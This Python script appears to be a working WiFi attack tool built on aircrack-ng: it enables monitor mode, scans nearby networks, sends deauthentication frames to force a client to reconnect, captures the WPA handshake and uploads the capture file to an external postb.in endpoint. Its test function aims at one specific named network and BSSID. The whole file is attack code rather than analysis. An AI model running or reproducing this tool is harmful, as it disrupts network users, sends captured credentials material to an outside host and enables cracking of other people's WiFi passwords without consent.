#!/usr/bin/env python

import CSVHelper
import ShellHelper
import XMLHelper
import JSONHelper
import requests

SERVER_ADDR = "https://postb.in/1602363645786-8894055658020"

#reset
def reset():
    ShellHelper.stopInterface()
    ShellHelper.rmOutputs()

#run airmon start
def startMonitoring():
    network_card = "wlan1"
    p = ShellHelper.commandAsRoot("airmon-ng start %s" % network_card)
    return network_card + "mon"

#run airodump who extract resut into airodump-01.kismet.csv
def getAllWifi(monitoring):
    command = "timeout 5 airodump-ng -w airodump --output-format kismet %s" % monitoring
    return ShellHelper.commandAsRootWithTimeout(command, 6)

#analyze network to see all devices into the network
def analyzeNetwork(network, monitoring, timeout):
    command = "timeout %i airodump-ng -c %s --bssid %s -w ./output/ %s" % (timeout, network['channel'],network['bssid'],monitoring)
    return ShellHelper.commandAsRootWithTimeout(command, 21)

#get handshake thanks to client
def getHandshake(bssid, mac, monitoring):
    command = "timeout 20 aireplay-ng -0 2 -a %s -c %s %s" % (bssid,mac ,monitoring)
    return ShellHelper.commandAsRootWithTimeout(command,21)

#-----STEP 1------
#get networks
def getNetworks():
    monitoring = startMonitoring()
    getAllWifi(monitoring)
    networks = CSVHelper.parseCSV("airodump-01.kismet.csv")
    reset()
    
    return JSONHelper.dumpListObject(networks)

#-----STEP 2------
#get devices
def getDevices(network):
    monitoring = startMonitoring()
    analyzeNetwork(network,monitoring,20)
    clients = XMLHelper.getClientMac("./output/-01.kismet.netxml")
    reset()
    return JSONHelper.dumpListObject(clients)
    

#-----STEP 3-----#
#Send handshake
def sendHandshake(network):
    name = network['essid'] + '_handshake.cap'
    with open('./output/-01.cap','rb') as f:
        r = requests.post(SERVER_ADDR,files={name: f})
    ShellHelper.rmHandshake()

#Get Handshake
def getAndSendHandshake(network,mac):
    monitoring = startMonitoring()
    analyzeNetwork(network,monitoring,5)
    result = getHandshake(network['bssid'],mac,monitoring)
    sendHandshake(network)
    reset()

#For testing
def main():
    network = {
        "encryption":"WPA,AES-CCM,TKIP",
        "essid": "SFR_9D10",
        "bssid": "60:35:C0:3A:9D:16",
        "channel": "1"
    }
    sendHandshake(network)

if __name__ == "__main__":
    main()